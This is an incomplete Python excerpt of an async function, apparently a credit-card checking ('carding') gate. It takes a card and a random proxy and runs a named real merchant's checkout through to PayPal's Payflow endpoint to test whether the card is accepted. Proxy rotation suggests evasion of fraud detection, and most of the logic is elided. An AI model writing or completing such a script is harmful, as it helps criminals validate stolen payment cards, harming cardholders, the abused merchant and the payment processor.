...
async def CMDPayflowAuth(cc, proxyrand):
    ...
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        ...
        try:
            ...
            async with session.get('https://www.keepsakebowling.com/checkout/cart/', proxy=str(proxyrand), timeout=timeout) as resp:
                try :          
            ...
            async with session.post(f'https://www.keepsakebowling.com/rest/default/V1/guest-carts/{cartid}/set-payment-information', proxy=str(proxyrand), json=data, timeout=timeout) as resp:
                try :
            ...
            async with session.post('https://www.keepsakebowling.com/paypal/transparent/requestSecureToken/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                try :          
                    rep = await resp.json()
            ...
            async with session.post('https://payflowlink.paypal.com/', proxy=str(proxyrand), data=data, timeout=timeout) as resp:
                try :          
                    response = await resp.text()
